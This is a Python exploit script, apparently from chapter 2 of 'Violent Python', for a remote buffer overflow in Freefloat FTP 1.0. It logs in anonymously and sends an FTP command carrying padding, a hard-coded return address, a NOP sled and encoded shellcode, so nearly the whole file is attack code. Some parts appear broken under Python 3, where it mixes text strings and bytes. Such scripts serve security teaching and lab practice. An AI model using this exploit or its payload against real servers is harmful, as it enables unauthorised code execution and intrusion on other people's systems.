#!/usr/bin/Python
''' freefloat2-overflow.py from chapter 2 of Violent Python'''
import sys
import socket
import time
import struct


def main():
    ''' main function'''
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} <target ip> <cmd>')
        print(f'Example: {sys.argv[0]} 192.168.1.10 PWNED')
        print('Other options: AUTH, APPE, ALLO, ACCT')
        sys.exit(0)
    target = sys.argv[1]
    command = sys.argv[2]
    if len(sys.argv) > 3:
        command = sys.argv[3]
    shellcode = '\xbf\xda\xc6\x1d\x9e\xda\xd9\xd9\x74\x24\xf4\x5d\x31\xc9' \
                '\xb1\x52\x31\x7d\x12\x83\xc5\x04\x03\x0b\x7e\x5f\x5b\x2f' \
                '\x96\x1d\xa4\xcf\x67\x42\x2c\x2a\x56\x42\x4a\x3f\xc9\x72' \
                '\x18\x6d\xe6\xf9\x4c\x85\x7d\x8f\x59\xaa\x36\x25\xbc\x85' \
                '\xc7\x16\xfc\x84\x4b\x65\xd1\x66\x75\xa6\x24\x67\xb2\xdb' \
                '\xc5\x35\x6b\x97\x78\xa9\x18\xe5\x40\x42\x52\xeb\xc0\xb7' \
                '\x23\x0a\xe0\x66\x3f\x55\x22\x89\xec\xed\x6b\x91\xf1\xc8' \
                '\x22\x2a\xc1\xa6\xb5\xfa\x1b\x46\x19\xc3\x93\xb5\x63\x04' \
                '\x13\x26\x16\x7c\x67\xdb\x21\xbb\x15\x07\xa7\x5f\xbd\xc3' \
                '\x1f\xbb\x3f\x07\xf9\x48\x33\xe4\x8d\x16\x57\xfb\x42\x2d' \
                '\x63\x70\x65\xe1\xe2\xc2\x41\x25\xae\x91\xe8\x7c\x0a\x77' \
                '\x14\x9e\xf5\x28\xb0\xd5\x18\x3c\xc9\xb4\x74\x71\xe0\x46' \
                '\x85\x1d\x73\x35\xb7\x82\x2f\xd1\xfb\x4b\xf6\x26\x7b\x61' \
                '\x4e\xb8\x82\x8a\xaf\x91\x40\xde\xff\x89\x61\x5f\x94\x49' \
                '\x8d\x8a\x3b\x19\x21\x65\xfc\xc9\x81\xd5\x94\x03\x0e\x09' \
                '\x85\x2c\xc4\x22\x2c\xd7\x8f\x0d\x5b\xd7\x1f\xe6\x9e\xd7' \
                '\x1f\x2a\x16\x31\x75\x42\x7f\xea\xe2\xfb\xda\x60\x92\x03' \
                '\xf1\x0d\x94\x88\xf6\xf2\x5b\x79\x72\xec\x0c\x89\x29\x4e' \
                '\xdb\x96\x87\xe6\xbf\x05\x4c\xe0\xc9\x36\xdb\xb7\x9e\x88' \
                '\x12\x5d\x32\xb3\x8c\x7f\xcf\x25\xf7\x3b\x14\x96\xf6\xba' \
                '\xd9\xa2\xdc\xaa\x27\x2a\x59\x9e\xff\x7d\x37\x48\xbd\xd4' \
                '\xf6\x22\x17\x8b\x50\xa2\xee\xe7\xc3\xb4\xf7\x22\xb5\x58' \
                '\x46\x9b\xe0\x67\x67\x4b\xe5\x10\x95\xeb\x0a\xcb\x1d\x0b' \
                '\xe9\x49\x54\xa4\xb4\x1c\x15\xa9\x47\xcb\x5a\xd4\xc4\xf9' \
                '\x23\x23\xd4\x88\x26\x6f\x52\x61\x5a\x80\x37\x85\xc9\xa1' \
                '\x12'
    ret = struct.pack('<L', 0x7C874413)
    padding = '\x90' * 20
    crash = '\x41' * 246 + ret + padding + shellcode
    print(f'Freefloat FTP 1.0 {command} Command Remote Buffer Overflow')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, 21))
    except:  # pylint: disable=bare-except
        print(f'[-] Connection to {target} failed!')
        sys.exit(0)
    print(f'[+] sending {len(crash)} + {command} bytes crash...')
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send("PASS \r\n")
    s.recv(1024)
    s.send(f'{command} {crash}\r\n')
    time.sleep(4)


if __name__ == '__main__':
    main()
